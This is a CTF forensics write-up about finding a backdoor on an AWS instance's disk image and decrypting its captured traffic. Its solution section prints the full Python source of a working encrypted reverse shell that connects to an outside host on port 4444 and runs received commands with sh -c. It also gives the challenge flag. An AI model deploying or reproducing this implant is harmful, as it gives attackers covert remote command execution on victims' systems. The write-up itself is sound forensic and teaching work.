# Sourced Traffic

Author: `anomie`

Saw suspicious traffic from one of our aws instances to an unusual port. We grabbed an image of the instance. See if you can figure out what is in the traffic

Disk image is at https://drive.google.com/file/d/19_B6LtovtjPmHE3Cv0uZgt7-IYxOHMiN/view?usp=sharing

## Dev Notes
Given files can be acquired with the command `make dist`, which produces a zip with the traffic capture file. Link to disk image is in the challenge description.


## Solution
Unpacking the provided disk image with `tar xJf disk.img.tar.xf`, we have:
```
> file disk.img
disk.img: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)
```
To take a further look, we can just mount the image.
```
sudo mkdir /mnt/chall
sudo mount -o loop disk.img /mnt/chall
```
First, let's check out `.bash_history` of the `ec2-user`:
```
sudo su
exit
sudo su
exit
```
Looking at the root home directory, there's a `flag.txt` that just says `lmao`, so that's probably not the actual flag. `.bash_history` is symlinked to (our) `/dev/null`, but `.python_history` shows `from Crypto.Cipher import AES`, which looks interesting.

Running `grep -r "from Crypto.Cipher import AES"`, there's a match in `/usr/bin/upkeep`. The source is reproduced below:

```python
#!/bin/python3

from Crypto.Cipher import AES
from secrets import token_bytes
from time import sleep
import socket
import struct
import subprocess

key = token_bytes(32)

def enc_send(sock, msg):
    nonce = token_bytes(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    enc_msg = aes.encrypt(msg)
    sock.sendall(struct.pack('<Q', len(enc_msg)))
    sock.sendall(enc_msg)
    sock.sendall(nonce)

def enc_recv(sock):
    nbytes = struct.unpack('<Q', sock.recv(8))[0]
    enc_msg = sock.recv(nbytes)
    nonce = sock.recv(12)
    aes = AES.new(key, AES.MODE_GCM, nonce)
    return aes.decrypt(enc_msg)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('3.83.112.42', 4444))
    sock.setblocking(True)
    sock.sendall(key)

    while True:
        cmd = enc_recv(sock)
        print(cmd)
        if cmd == b'disconnect':
            return
        try:
            out = subprocess.check_output(['sh', '-c', cmd])
        except:
            out = b'command failed'
        enc_send(sock, out)


if __name__ == "__main__":
    main()
```


The client communicates with a hardcoded destination of 3.83.112.42 on TCP port 4444, so we can filter by `ip.dst == 3.83.112.42 && tcp.port == 4444` in Wireshark, follow the TCP stream, then export the conversation as raw bytes. The client initially sends a random 32-byte key for AES-GCM. All subsequent messages from both the client and the server are structured as 8 bytes of ciphertext length in little-endian, followed by the bytes of the actual ciphertext, then 12 bytes for a nonce. See `solve.py` for details.

Flag: `gigem{s1mpl3_tr4ff1c_d3crypt10n}`
